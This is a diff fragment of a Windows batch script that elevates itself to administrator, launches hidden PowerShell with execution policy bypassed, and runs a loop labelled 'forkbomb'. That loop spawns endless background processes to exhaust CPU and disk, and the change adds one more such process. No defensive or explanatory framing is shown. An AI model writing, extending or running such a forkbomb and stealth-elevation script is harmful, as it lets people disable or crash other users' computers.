@@ -7,7 +7,7 @@ powershell -Command "Start-Process '%~f0' -ArgumentList 'admin' -Verb RunAs"
 exit /b
 :admin
 
-::admin++
+
 if not "%1"=="bios_level" (
     powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "
         $code = @'
@@ -100,5 +100,6 @@ start /b cmd /c for /L %%i in (1,0,1000000) do echo STRESS >nul
 start /high /min cmd /c "for /l %%n in () do set /a n=%%n*%%n"
 start /b cmd /c "for /l %%n in () do (echo %%n >nul)"
 start /b cmd /c "for /l %%n in () do (md %%n && rd %%n)"
-
+start /b cmd /c "for /l %%n in () do set /a dummy=!random!*!random!"
 goto forkbomb
+
